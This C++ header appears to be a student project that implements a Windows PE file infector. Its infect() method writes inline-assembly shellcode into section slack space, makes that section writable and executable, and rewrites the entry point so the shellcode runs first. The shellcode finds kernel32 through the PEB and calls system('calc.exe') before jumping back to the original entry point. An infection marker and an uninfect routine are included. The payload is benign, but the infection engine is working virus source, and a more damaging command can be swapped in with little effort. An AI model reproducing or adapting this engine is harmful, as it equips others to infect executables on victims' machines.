#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include "peHeader.h"
#include <string.h>
#include <typeinfo>
#include <io.h>

using namespace std;
//#define _DEBUG_H 
#define IMAGE_INFECTED_SINGNATURE 0x06060606

class BaseTool
{
public:
	//static函数
	static int isSuitable(char *filename)
		//判断是否已经被感染过
		//-1:打开文件失败
		// 0:文件不是PE文件
		// 1:文件是PE文件,但是被感染过了
		// 2:文件是PE文件,而且没有被感染
	{
		FILE *fp = fopen(filename, "rb+");
		if (fp == NULL)
		{
			return -1;
		}
		IMAGE_DOS_HEADER dosheader = { 0 };

		__getBytes((char*)&dosheader, sizeof(dosheader), 0, fp);
		if (dosheader.e_magic != IMAGE_DOS_SIGNATURE)
		{
			fclose(fp);
			return 0;
		}
		_IMAGE_NT_HEADERS nth = { 0 };
		__getBytes((char*)&nth, sizeof(nth), dosheader.e_lfanew, fp);
		if (nth.Signature != IMAGE_NT_SIGNATURE)
		{
			fclose(fp);
			return 0;
		}
		DWORD infectSignature;
		__getBytes((char*)&infectSignature, sizeof(DWORD), sizeof(dosheader), fp);
		if (infectSignature != IMAGE_INFECTED_SINGNATURE)
		{
			fclose(fp);
			return 2;
		}
		fclose(fp);
		return 1;
	}
	static void __getBytes(char * _dst, size_t _len, long _offset_file, FILE *fp)
	{
		int cnt = 0;
		if (fp == NULL)
		{
			return;
		}
		fseek(fp, _offset_file, 0);
		while (_len--)
		{
			fscanf(fp, "%c", _dst++);
			cnt++;
		}
	}

	static void __setBytes(char *_src, int _len, long _offset_file, FILE*fp)
	{
		int cnt = 0;

		if (fp == NULL)
		{
			return;
		}
		else
		{
			char c = 0;
			fseek(fp, 0, 0);
			while (fscanf(fp, "%c", &c) != EOF)
			{
				fprintf(fp, "%c", c);
			}
			fseek(fp, _offset_file, 0);
			for (int i = 0; i < _len; i++)
			{
				fprintf(fp, "%c", _src[i]);
				cnt++;
			}

		}
	}
public:
	BaseTool() :fp(0), FILEPOINT(0), section_headers(0), number_of_section(0)
	{

	}
public:
	BaseTool(char *filename) :fp(0), FILEPOINT(0), section_headers(0), number_of_section(0)
	{
		fp = fopen(filename, "rb+");
		
		if (fp == NULL)
		{
			printf("Error when load file!!!!");
			exit(-1);
		}
		memset(FILENAME, 0, 128);
		memcpy(FILENAME, filename, strlen(filename));
	}
	int getBytes(char * _dst,size_t _len,long _offset_file,FILE *fp=NULL)
	{
		int cnt = 0;
		if (fp == NULL)
		{
			fp = this->fp;
		}
		fseek(fp, _offset_file, 0);
		while (_len--)
			{
				fscanf(fp, "%c", _dst++);
				cnt++;
			}
		return cnt;
	}

	int setBytes(char *_src, int _len, long _offset_file, FILE*fp = NULL)
		//最后需要将校验和修改
	{
		int cnt = 0;
		
		if (fp == NULL)
		{
			fp = this->fp;
			fseek(fp, _offset_file, 0);
			for (int i = 0; i < _len;i++)
			{
				fprintf(fp, "%c", _src[i]);
				cnt++;
			}
		}
		else
		{	
			char c = 0;
			fseek(this->fp, 0, 0);
			while (fscanf(this->fp,"%c",&c)!=EOF)
			{
				fprintf(fp, "%c", c);
			}
			fseek(fp, _offset_file, 0);
			for (int i = 0; i < _len; i++)
			{
				fprintf(fp, "%c", _src[i]);
				cnt++;
			}

		}

		return cnt;
	}
	void display(const char * _src, int _len)
	{
		for (int i = 0; i < _len;i++)
		{
			unsigned char ch= 0;
			ch = _src[i];
			printf("%0.2X ", ch);
		}
	}
	~BaseTool()
	{
		if (fp)
		{
			fclose(fp);
		}
	}
	LONG get_entry(FILE *fp = NULL)
		//pe head!!!! not execution entry.
	{
		long rst = 0;
		getBytes((char *)&rst, sizeof(LONG), sizeof(IMAGE_DOS_HEADER)-sizeof(LONG),fp);
		return rst;
	}
	LONG get_Address_of_EntryPoint(FILE *fp = NULL)
	{
		LONG rst = 0;
		_IMAGE_NT_HEADERS nth = get_IMAGE_NT_HEADER(fp);
		rst = nth.OptionalHeader.AddressOfEntryPoint;
		return rst;
	}
	LONG get_Number_OF_Section(FILE * fp = NULL)
	{
		WORD rst = 0;
		_IMAGE_NT_HEADERS nt = get_IMAGE_NT_HEADER(fp);
		rst = nt.FileHeader.NumberOfSections;
		return rst;
	}
	IMAGE_DOS_HEADER get_IMAGE_DOS_HEADER(FILE *fp = NULL)
	{
		fp = (fp == NULL) ? this->fp : fp;
		char * buf = (char *)malloc(sizeof(IMAGE_DOS_HEADER));
		memset(buf, 0, sizeof(IMAGE_DOS_HEADER));
		getBytes(buf, sizeof(IMAGE_DOS_HEADER), 0);
		if (fp == this->fp)
		{
			this->e_lfnew = ((IMAGE_DOS_HEADER *)buf)->e_lfanew;
		}
		return (IMAGE_DOS_HEADER)*((IMAGE_DOS_HEADER *)buf);
	}
	_IMAGE_NT_HEADERS get_IMAGE_NT_HEADER(FILE * fp = NULL)
	{
		fp = (fp == NULL) ? this->fp : fp;
		LONG e_lfnew = (fp == NULL) ? this->e_lfnew : get_entry(fp);
		char * buf = (char *)malloc(sizeof(_IMAGE_NT_HEADERS));
		memset(buf, 0, sizeof(_IMAGE_NT_HEADERS));
		getBytes(buf, sizeof(_IMAGE_NT_HEADERS), this->e_lfnew);
		return (_IMAGE_NT_HEADERS)*((_IMAGE_NT_HEADERS*)buf);
	}
	void get_IMAGE_SECTION_HEADERS(_IMAGE_SECTION_HEADER *_dst, size_t *_cnt, FILE *fp = NULL)
	{
		fp = (fp == NULL) ? this->fp : fp;
		*_cnt = (size_t)get_Number_OF_Section(fp);
		long  offset = get_entry() +sizeof(_IMAGE_NT_HEADERS);
		getBytes((char*)_dst, sizeof(IMAGE_SECTION_HEADER)*(*_cnt), offset,fp);
		if (fp == this->fp && section_headers == NULL)
		{
			number_of_section = *_cnt;
			section_headers = (IMAGE_SECTION_HEADER *)malloc(sizeof(IMAGE_SECTION_HEADER)*number_of_section);
			memcpy(section_headers, _dst, sizeof(IMAGE_SECTION_HEADER)*(*_cnt));
		}
	}
	unsigned int rva_To_fa(unsigned int rva)
		//将相对虚拟地址转为文件偏移地址
	{
		unsigned int fa = 0;

		if (section_headers == NULL)
		{
			number_of_section = get_Number_OF_Section();
			section_headers = (IMAGE_SECTION_HEADER *)malloc(sizeof(IMAGE_SECTION_HEADER)*number_of_section);
			size_t cnt = 0;
			get_IMAGE_SECTION_HEADERS(section_headers, &cnt);
		}
		
		if (rva < (get_entry() + sizeof(_IMAGE_NT_HEADERS)+number_of_section*sizeof(IMAGE_SECTION_HEADER)))
			//rva还是在头部
		{
			return rva;
		}

		int i = 0;

		for ( i = 0; i < (number_of_section-1); i++)
		{
			if (rva >= section_headers[i].VirtualAddress && rva<section_headers[i+1].VirtualAddress)
				//夹在之间的,
			{
				break;
			}
		}
		int off = rva - section_headers[i].VirtualAddress;
		fa = section_headers[i].PointerToRawData + off;
		return fa;
	}
	unsigned int rva_To_fva(unsigned int rva)	
	{
		return 0;
	}

	unsigned int fa_To_rva(unsigned int fa)
	{
		unsigned int rva = 0;

		if (section_headers == NULL)
		{
			number_of_section = get_Number_OF_Section();
			section_headers = (IMAGE_SECTION_HEADER *)malloc(sizeof(IMAGE_SECTION_HEADER)*number_of_section);
			size_t cnt = 0;
			get_IMAGE_SECTION_HEADERS(section_headers, &cnt);
		}

		if (fa < (get_entry() + sizeof(_IMAGE_NT_HEADERS)+number_of_section*sizeof(IMAGE_SECTION_HEADER)))
			//fa还是在头部
		{
			return fa;
		}

		int i = 0;

		for (i = 0; i < (number_of_section - 1); i++)
		{
			if (fa >= section_headers[i].PointerToRawData && fa<section_headers[i + 1].PointerToRawData)
				//夹在之间的,
			{
				break;
			}
		}

		int off = fa - section_headers[i].PointerToRawData;
		rva = section_headers[i].VirtualAddress + off;
		return rva;
	}

	unsigned int rva_to_va(unsigned int rva)
	{
		_IMAGE_NT_HEADERS nth = get_IMAGE_NT_HEADER();
		return nth.OptionalHeader.ImageBase + rva;
	}

	unsigned int va_to_rva(unsigned int va)
	{
		_IMAGE_NT_HEADERS nth = get_IMAGE_NT_HEADER();
		return va-nth.OptionalHeader.ImageBase ;
	}
	IMAGE_IMPORT_DESCRIPTOR* get_IMAGE_IMPORT_DESCRIPTORS(int *cnt=NULL)
	{
		IMAGE_IMPORT_DESCRIPTOR *rst = NULL;
		_IMAGE_NT_HEADERS nth = get_IMAGE_NT_HEADER();
		int import_count = nth.OptionalHeader.DataDirectory[1].Size/20;
		rst = (IMAGE_IMPORT_DESCRIPTOR*)malloc(sizeof(IMAGE_IMPORT_DESCRIPTOR)*import_count);
		getBytes((char*)rst, sizeof(IMAGE_IMPORT_DESCRIPTOR)*import_count, rva_To_fa(nth.OptionalHeader.DataDirectory[1].VirtualAddress));
		if (cnt!=NULL)
		{
			*cnt = import_count;
		}
		return rst;
	}
	void change_AddressEntry(DWORD rva)
	{
		if (e_lfnew == 0)
		{
			e_lfnew=get_IMAGE_DOS_HEADER().e_lfanew;
		}
		int offset = this->e_lfnew + sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+sizeof(WORD)+
			sizeof(BYTE)+
			sizeof(BYTE)+
			sizeof(DWORD)* 3;
		setBytes((char*)&rva, sizeof(DWORD), offset);
	}

	DWORD getKernal32Base()
	{
		DWORD rst;
		_asm
		{
			push edx
				mov edx, fs:[30h]
				mov edx, [edx+0ch]
				mov edx, [edx+1ch]
				mov edx, [edx]
				mov edx, [edx+8h]
				mov rst,edx
			pop edx
		}
		return rst;
	}
	DWORD getAddressOfGetProcAddre()
	{
		DWORD rst;
		DWORD pKernel32;
		_asm
		{
			    push eax
				push esi
				push edx
				push ebp
				push esp
				push ecx
				sub esp,400h

				mov eax, fs:[30h]
				mov eax, [eax + 0ch]
				mov eax, [eax + 1ch]
				mov eax, [eax]
				mov eax, [eax + 8h]
				mov pKernel32, eax

				mov ebp,eax
				mov eax, [ebp+3Ch]
				mov edx, [ebp + eax + 78h]
				add edx, ebp; edx = 引出表地址
				mov ecx, [edx + 18h]; ecx = 输出函数的个数
				mov ebx, [edx + 20h]
				add ebx, ebp; ebx ＝函数名地址，AddressOfName
			search :
				dec ecx
					mov esi, [ebx + ecx * 4]
					add esi, ebp; 依次找每个函数名称
					; GetProcAddress
					mov eax, 0x50746547
					cmp[esi], eax; 'PteG'
					jne search
					mov eax, 0x41636f72
					cmp[esi + 4], eax; 'Acor'
					jne search
					; 如果是GetProcA，表示找到了
					mov ebx, [edx + 24h]
					add ebx, ebp; ebx = 序号数组地址, AddressOf
					mov cx, [ebx + ecx * 2]; ecx = 计算出的序号值
					mov ebx, [edx + 1Ch]
					add ebx, ebp; ebx＝函数地址的起始位置，AddressOfFunction
					mov eax, [ebx + ecx * 4]
					add eax, ebp; 利用序号值，得到出GetProcAddress的地址
					sub eax, 0xb0
					mov edx,eax

					
				add esp, 400h
				pop ecx
				pop esp
				pop ebp
				pop edx
				mov rst,eax
				pop esi
				pop eax		
				
		}
		return rst;
	}
	void uninfect()
	{
		get_IMAGE_DOS_HEADER();
		DWORD realEntryPoint = 0;
		getBytes((char*)&realEntryPoint, sizeof(DWORD), sizeof(DWORD)+sizeof(IMAGE_DOS_HEADER));
		change_AddressEntry(realEntryPoint);
		DWORD infectedSign = 0;
		setBytes((char*)&infectedSign, 4, sizeof(IMAGE_DOS_HEADER));
	}
	int infect(FILE * fp=NULL )
		//目标文件必须是未感染的exe文件感染代码
	{
		fp = (fp == NULL )? this->fp : fp;
		auto dosh = get_IMAGE_DOS_HEADER(fp);
		DWORD newentry = 0;
		if (dosh.e_magic != 0x5a4d)
			//不是MZ文件
		{
#ifdef _DEBUG_H
			printf("It is not MZ file.\n");
#endif
			return -1;
		}
		auto fileh = get_IMAGE_NT_HEADER(fp);
		if (fileh.Signature != 0x4550)
			//不是PE文件
		{
#ifdef _DEBUG_H
			printf("It is not PE file\n");
#endif
			return - 1;
		}
		
		size_t sectionCnt = get_Number_OF_Section();
		IMAGE_SECTION_HEADER*  sectionheaders = (IMAGE_SECTION_HEADER*)malloc(sizeof(IMAGE_SECTION_HEADER)*sectionCnt);
		get_IMAGE_SECTION_HEADERS(sectionheaders, &sectionCnt);
#ifdef _DEBUG_H
		for (int i = 0; i < sectionCnt; i++)
		{
			sectionheaders[i].display();
		}
#endif
		
	    
		
		//定位到节表的最后一个位置的文件偏移 fva,然后把这个转化为rva,写入到程序的入口点AddressOfEntry
		DWORD finalOfSections_fva = sectionheaders[sectionCnt-1].PointerToRawData+sectionheaders[sectionCnt-1].Misc.VirtualSize;
		{
			//病毒代码块
			//数据区
			DWORD oldEntry = fileh.OptionalHeader.AddressOfEntryPoint;//-92
			DWORD baseOfmsvcr120 = 0;//-88
			DWORD addOfprintf = 0;//-84
			DWORD addOfcurrent = 0;//-80
			char dllname[16] = "msvcr120.dll";//-76
			char functionname[16] = "system";//-60
			char info[16] = "calc.exe";//-44
			char loadlibraryEx[16] = "LoadLibraryExA";//-28
			DWORD pLoadLibraryExA = 0;//-12
			DWORD kernelBase = 0;//-8
			DWORD getProcAddr = 0;//-4
			

			DWORD start, end;
			_asm
			{
				mov eax,begin1
				mov start, eax;
				mov eax,end1

				mov end, eax;
				jmp end2
				begin1:
				
				call A
				A :
				pop edi		
						//可能会有一定偏移
						sub edi,5
					mov [edi-80], edi;//assign current address.

				push ebx;
				push eax
					push esi
					push edx
					push ebp
					push esp
					push ecx

					sub esp, 400h
					mov eax, [ebp + 4];

				mov eax, fs:[30h]
					mov eax, [eax + 0ch]
					mov eax, [eax + 1ch]
					mov eax, [eax]
					mov eax, [eax + 8h]
					mov [edi-8], eax;
				push edi
				mov edi, eax
					mov eax, [edi + 3Ch]
					mov edx, [edi + eax + 78h]
					add edx, edi; edx = 引出表地址
					mov ecx, [edx + 18h]; ecx = 输出函数的个数
					mov ebx, [edx + 20h]
					add ebx, edi; ebx ＝函数名地址，AddressOfName

				search :
				dec ecx
					mov esi, [ebx + ecx * 4]
					add esi, edi; 依次找每个函数名称
					; GetProcAddress
					mov eax, 0x50746547
					cmp[esi], eax; 'PteG'
					jne search
					mov eax, 0x41636f72
					cmp[esi + 4], eax; 'Acor'
					jne search
					; 如果是GetProcA，表示找到了
					mov ebx, [edx + 24h]
					add ebx, edi; ebx = 序号数组地址, AddressOf
					mov cx, [ebx + ecx * 2]; ecx = 计算出的序号值
					mov ebx, [edx + 1Ch]
					add ebx, edi; ebx＝函数地址的起始位置，AddressOfFunction
					mov eax, [ebx + ecx * 4]
					add eax, edi; 利用序号值，得到出GetProcAddress的地址
					sub eax, 0xb0
					pop edi
					mov ebx, edi;
					mov [ebx-4], eax;//GetProcAddress的地址
					
				sub ebx,28
				push ebx
				add ebx,28
				push [ebx-8];
				call [ebx-4];
				mov [ebx-12], eax;//LoadLibrary的地址


				push 0x00000010
					push 0x00000000
					
					sub ebx,76
					push ebx
					add ebx,76
					//push eax
				call [ebx-12]

					mov [ebx-88], eax;

				mov edx, eax
					sub ebx,60
					push ebx
					add ebx,60
					push edx
					call [ebx-4];//得到printf的地址

				mov [ebx-84], eax;
				sub ebx,44
				push ebx
				add ebx,44
				call eax
					add esp, 4;

				add esp, 400h
					pop ecx
					pop esp
					pop ebp
					pop edx

					pop esi
					pop eax
					pop ebx;
				push eax
				mov eax, fs:[30h]
					mov eax, DWORD PTR [eax+8]
					add eax, [edi-92]
					mov edi,eax
					pop eax
					jmp edi

			end1:
					nop		
			end2:
				nop
			}
			DWORD codeAddSize = (16 + 16 + 16 + 16 + 16 + 12 + end - start);
			int i = 0;
			for (i = 0; i < sectionCnt-1; i++)
			{
				if ((sectionheaders[i + 1].VirtualAddress - sectionheaders[i].VirtualAddress - sectionheaders[i].Misc.VirtualSize)> codeAddSize)
				//空间足够
				{
					break;
				}
			}

			sectionheaders[i].Characteristics = 0xE00000E0;// IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
			finalOfSections_fva = sectionheaders[i].Misc.VirtualSize + sectionheaders[i].PointerToRawData;
			//把这些数据写入最后一个代码段
			setBytes((char*)&oldEntry, 4, finalOfSections_fva + 0);
			setBytes((char*)&baseOfmsvcr120, 4, finalOfSections_fva + 4);
			setBytes((char*)&addOfprintf, 4, finalOfSections_fva + 8);
			setBytes((char*)&addOfcurrent, 4, finalOfSections_fva + 12);
			setBytes(dllname, 16, finalOfSections_fva + 16);
			setBytes(functionname, 16, finalOfSections_fva + 16 + 16);
			setBytes(info, 16, finalOfSections_fva + 16 + 16 + 16);
			setBytes(loadlibraryEx, 16, finalOfSections_fva + 16 + 16 + 16 + 16);
			setBytes((char*)&pLoadLibraryExA, 4, finalOfSections_fva + 16 + 16 + 16 + 16 + 16);
			setBytes((char*)&kernelBase, 4, finalOfSections_fva + 16 + 16 + 16 + 16 + 16 + 4);
			setBytes((char*)&getProcAddr, 4, finalOfSections_fva + 16 + 16 + 16 + 16 + 16 + 8);

			setBytes((char*)start, end - start, finalOfSections_fva + 16 + 16 + 16 + 16 + 16 + 12);
			newentry = finalOfSections_fva + 16 + 16 + 16 + 16 + 16 + 12;
			//计算jmp到原来代码的入口
			DWORD fileAddSize = fileh.OptionalHeader.FileAlignment*(1 +  codeAddSize/ fileh.OptionalHeader.FileAlignment);
			

			DWORD rva_off_sum = 0;// sectionheaders[sectionCnt - 1].VirtualAddress + sectionheaders[sectionCnt - 1].Misc.VirtualSize
			sectionheaders[i].SizeOfRawData +=fileAddSize;
			//sectionheaders[sectionCnt - 1].PointerToRawData += 16 + 16 + 16 + 16 + 16 + 12 + end - start;
			sectionheaders[i].Misc.VirtualSize += 16 + 16 + 16 + 16 + 16 + 12 + end - start;
			//sectionheaders[0].Misc.VirtualSize += 16 + 16+ 16 + 16+ 16+ 12;
			//rva_off_sum = sectionheaders[sectionCnt - 1].VirtualAddress + sectionheaders[sectionCnt - 1].Misc.VirtualSize;
			setBytes((char*)sectionheaders, sizeof(_IMAGE_SECTION_HEADER)*sectionCnt, e_lfnew + sizeof(_IMAGE_NT_HEADERS));
			//fileh.OptionalHeader.SizeOfImage += (16 + 16 + 16 + 16 + 16 + 12 + end - start);
			//fileh.OptionalHeader.SizeOfCode = ( (fileh.OptionalHeader.SizeOfCode + codeAddSize) / fileh.OptionalHeader.FileAlignment)*fileh.OptionalHeader.FileAlignment;

			setBytes((char*)&fileh.OptionalHeader.SizeOfCode, sizeof(DWORD), e_lfnew + sizeof(fileh.Signature) + sizeof(fileh.FileHeader) + (char*)&fileh.OptionalHeader.SizeOfCode - (char*)&fileh.OptionalHeader);
			//fileh.OptionalHeader.SizeOfImage += (1 + (16 + 16 + 16 + 16 + 16 + 12 + end - start) / fileh.OptionalHeader.SectionAlignment)*fileh.OptionalHeader.SectionAlignment;
			setBytes((char*)&fileh.OptionalHeader.SizeOfImage, sizeof(DWORD), e_lfnew+sizeof(fileh.Signature)+sizeof(fileh.FileHeader)+(char*)&fileh.OptionalHeader.SizeOfImage - (char*)&fileh.OptionalHeader);
			//加入感染标记,同时把感染前的入口点保存在感染标记后面
			DWORD infectedSignature = IMAGE_INFECTED_SINGNATURE;
			setBytes((char*)&infectedSignature, sizeof(infectedSignature), sizeof(IMAGE_DOS_HEADER));
			setBytes((char*)&oldEntry, sizeof(oldEntry), sizeof(DWORD)+sizeof(IMAGE_DOS_HEADER));
		}
		
		change_AddressEntry(fa_To_rva(newentry));
		return 0;
	}

public:
	FILE * fp;
	char * FILEPOINT;
	LONG e_lfnew;
	LONG AddressOfentry;
	_IMAGE_SECTION_HEADER * section_headers;
	int number_of_section;
	char FILENAME[128] ;

};

